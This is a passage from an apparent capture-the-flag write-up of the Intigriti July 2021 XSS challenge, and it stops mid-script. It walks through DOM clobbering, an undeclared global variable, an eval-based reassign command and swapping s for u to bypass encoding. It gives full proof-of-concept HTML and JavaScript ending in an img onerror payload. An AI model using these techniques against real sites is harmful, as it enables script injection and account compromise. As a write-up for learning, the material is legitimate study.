+<span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hide code if not on iframe</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Then there are these checks to pass:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>top<span class="token punctuation">.</span><span class="token constant">DEV</span><span class="token punctuation">)</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Production build!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+    <span class="token keyword">let</span> <span class="token function-variable function">checkCredentials</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">let</span> users <span class="token operator">=</span> top<span class="token punctuation">.</span>store<span class="token punctuation">.</span>users<span class="token punctuation">;</span>
+            <span class="token keyword">let</span> access <span class="token operator">=</span> <span class="token punctuation">[</span>users<span class="token punctuation">.</span>admin<span class="token punctuation">,</span> users<span class="token punctuation">.</span>moderator<span class="token punctuation">,</span> users<span class="token punctuation">.</span>manager<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>users <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">of</span> access<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>username <span class="token operator">===</span> username <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span>
+                    <span class="token keyword">return</span> <span class="token boolean">true</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> _onmessage <span class="token operator">=</span> onmessage<span class="token punctuation">;</span>
+    <span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> m <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>m<span class="token punctuation">.</span>credentials <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">checkCredentials</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>username<span class="token punctuation">,</span> m<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// do nothing if unauthorized</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment">// ...</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// hide this script on production</span>
+    document<span class="token punctuation">.</span>currentScript<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>top.DEV</code> must be truthy, and the credentials passed in must match <code>top.store.users.admin.username</code> and <code>top.store.users.admin.password</code>.</p>
+<p>So should I write my own page and set these global variables?</p>
+<p>Unfortunately, due to the existence of Same Origin Policy, you can only access the contents of windows under the same origin page. Therefore, if you embed console.php in a page you wrote yourself, an error will occur when accessing <code>top.DEV</code>.</p>
+<p>So we need a same-origin page that allows us to set some things. And this page is obviously htmledit.php, which allows us to insert some HTML.</p>
+<h2><span id="dom-clobbering">DOM clobbering</span></h2><p>How do we set global variables without executing JS? Yes, it’s DOM clobbering.</p>
+<p>For example, if you have a <code>&lt;div id=&quot;a&quot;&gt;&lt;/div&gt;</code>, in JS you can use <code>window.a</code> or <code>a</code> to access the DOM of this div.</p>
+<p>If you are not familiar with DOM clobbering, you can refer to my previous article <a href="https://blog.huli.tw/2021/01/23/dom-clobbering/">A Brief Discussion on the Principle and Application of DOM Clobbering</a>, or this one is also well written: <a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/">Expanding XSS with Dom Clobbering</a></p>
+<p>If you want to achieve multi-level variable setting, you need to use <code>iframe</code> with <code>srcdoc</code>:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEV<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>store<span class="token punctuation">"</span></span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>
+    &lt;a id="users">&lt;/a>
+    &lt;a id="users" name="admin" href="ftp://a:a@a">&lt;/a>
+    <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframeConsole<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://challenge-0721.intigriti.io/console.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Here we also use a feature that the username attribute of the a element will be the username in the href attribute URL.</p>
+<p>In this way, <code>top.DEV</code> will be the DOM of <code>a id=&quot;DEV&quot;&gt;&lt;/a&gt;</code>, and <code>store.users</code> will be an HTMLCollection. <code>store.users.admin</code> is that a, and <code>store.users.admin.username</code> will be the username in href, which is <code>a</code>, and the password is the same.</p>
+<p>In summary, I can write my own HTML and use <code>window.open</code> to open htmledit.php and bring the above content into it:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>XSS POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> htmlUrl <span class="token operator">=</span> <span class="token string">'https://challenge-0721.intigriti.io/htmledit.php?code='</span>
+    <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+      &lt;a id="DEV">&lt;/a>
+      &lt;iframe name="store" srcdoc='
+        &lt;a id="users">&lt;/a>
+        &lt;a id="users" name="admin" href="ftp://a:a@a">&lt;/a>
+      '>&lt;/iframe>
+      &lt;iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php">&lt;/iframe>
+    </span><span class="token template-punctuation string">`</span></span>
+
+    <span class="token keyword">var</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>htmlUrl <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// wait unitl window loaded</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'go'</span><span class="token punctuation">)</span>
+      <span class="token keyword">const</span> credentials <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'a'</span>
+      <span class="token punctuation">&#125;</span>
+      win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>
+        credentials
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span>
+
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In this way, I can use postMessage to send messages in.</p>
+<p>Although it took some effort, this is just the beginning.</p>
+<h2><span id="level-2-make-safe-true">Level 2: Make safe true</span></h2><p>To make safe true, so that <code>&lt;</code> will not be escaped when calling log, we need to find a call that passes in four parameters, because the fourth one will be the value of safe:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">case</span> <span class="token string">"logv"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// display variable's value by its name</span>
+    <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[logv]: "</span><span class="token punctuation">,</span> window<span class="token punctuation">[</span>m<span class="token punctuation">.</span>message<span class="token punctuation">]</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">case</span> <span class="token string">"compare"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// compare variable's value to a given one</span>
+    <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[compare]: "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>window<span class="token punctuation">[</span>m<span class="token punctuation">.</span>message<span class="token punctuation">.</span>variable<span class="token punctuation">]</span> <span class="token operator">===</span> m<span class="token punctuation">.</span>message<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;)</code> is the function call I’m looking for, and the second parameter in it will be <code>window[m.message]</code>, which means that any global variable can be passed in as data. But what should be passed in?</p>
+<h2><span id="level-3-find-the-variables-that-can-be-passed-in">Level 3: Find the variables that can be passed in</span></h2><p>I’ve been stuck here for a long time because I can’t think of what can be passed in here. There used to be a trick to pass in name, but this webpage has already set its own name so it cannot be used. Another trick is to use URL to pass in and put things on location, but <code>log</code> will check whether <code>data</code> is a string. If it is not, it needs to be passed through <code>JSON.stringify</code>, which will encode the content.</p>
+<p>I had to keep repeating and looking at the code to see if I could find something new, and I really did. The following code has a common problem for beginners. Can you see it?</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">checkCredentials</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> users <span class="token operator">=</span> top<span class="token punctuation">.</span>store<span class="token punctuation">.</span>users<span class="token punctuation">;</span>
+        <span class="token keyword">let</span> access <span class="token operator">=</span> <span class="token punctuation">[</span>users<span class="token punctuation">.</span>admin<span class="token punctuation">,</span> users<span class="token punctuation">.</span>moderator<span class="token punctuation">,</span> users<span class="token punctuation">.</span>manager<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>users <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">of</span> access<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>username <span class="token operator">===</span> username <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The problem lies in <code>for (x of access) &#123;</code>, where <code>x</code> was not declared, so it defaults to a global variable. Here, <code>x</code> will be <code>top.store.users.admin</code>, which is the <code>&lt;a&gt;</code> we set ourselves.</p>
+<h2><span id="level-4-bypassing-type-check">Level 4: Bypassing Type Check</span></h2><p>Now that we have <code>x</code>, we can pass it into the <code>log</code> function using the <code>logv</code> command. Since <code>safe</code> is true, we can directly display the contents of <code>x</code> using <code>innerHTML</code>.</p>
+<p>If you convert an <code>a</code> element to a string, you will get the contents of <code>a.href</code>, so we can put our payload in <code>href</code>.</p>
+<p>However, <code>log</code> checks the type of <code>data</code>, and <code>a</code> is not a string, so it fails the check. What should we do?</p>
+<p>At this point, I looked back at the code and found this command:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">case</span> <span class="token string">"reassign"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// change variable's value</span>
+    <span class="token keyword">let</span> o <span class="token operator">=</span> m<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> RegExp <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[s-zA-Z-+0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>RegExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Invalid input given!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Value of "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" was changed to "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>o<span class="token punctuation">.</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'warn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[reassign]: "</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Error changing value (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>err<span class="token punctuation">.</span>message<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I can do this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'reassign'</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">message</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token string">'x+1'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    credentials
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This is equivalent to <code>Z=x+1</code>, and when <code>x+1</code> is automatically converted to a string, <code>Z</code> will be a string containing our payload.</p>
+<h2><span id="level-5-bypassing-encode">Level 5: Bypassing Encode</span></h2><p>Although we can now pass in a string, there is still one thing to do. The contents of <code>href</code> are URL-encoded, so <code>&lt;</code> becomes <code>%3C</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> <span class="token string">'ftp://a:a@a#&lt;img src=x onload=alert(1)>'</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token comment">// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>What should we do now?</p>
+<p>In <code>log</code>, there is a line that says <code>data = parse(data)</code>, and the code for <code>parse</code> is like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">parse</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> e <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">s</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// make object look like string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>If <code>e</code> is a string, it returns <code>s(e)</code>, and <code>s</code> is another function.</p>
+<p>When I was looking at the code, I noticed the rules for <code>eval</code> checking at the reassign part: <code>RegExp = /^[s-zA-Z-+0-9]+$/;</code>, and these four functions:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">anchor</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> <span class="token function-variable function">s</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token string">'NFC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> <span class="token function-variable function">u</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">unescape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> <span class="token function-variable function">t</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Among them, <code>s</code>, <code>u</code>, and <code>t</code> are allowed, which means that they can be swapped using the <code>reassign</code> command! We can replace <code>s</code> with <code>u</code>, so that <code>data</code> will be unescaped!</p>
+<p>So the final code will look like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> htmlUrl <span class="token operator">=</span> <span class="token string">'https://challenge-0721.intigriti.io/htmledit.php?code='</span>
+<span class="token keyword">const</span> insertPayload<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;img src=x onerror=alert(1)></span><span class="token template-punctuation string">`</span></span>
+<span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+  &lt;a id="DEV">&lt;/a>
+  &lt;iframe name="store" srcdoc='
+    &lt;a id="users">&lt;/a>
+    &lt;a id="users" name="admin" href="ftp://a:a@a#</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>insertPayload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/a>
+  '>&lt;/iframe>
+  &lt;iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php">&lt;/iframe>
+</span><span class="token template-punctuation string">`</span></span>
+
+<span class="token keyword">var</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>htmlUrl <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 等待 window 載入完成</span>
+<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'go'</span><span class="token punctuation">)</span>
+  <span class="token keyword">const</span> credentials <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'a'</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token comment">// s=u</span>
+  win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'reassign'</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">message</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token string">'u'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    credentials
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+
+  <span class="token comment">// Z=x+1 so Z = x.href + 1</span>
+  win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'reassign'</span><span class="token punctuation">,</span>
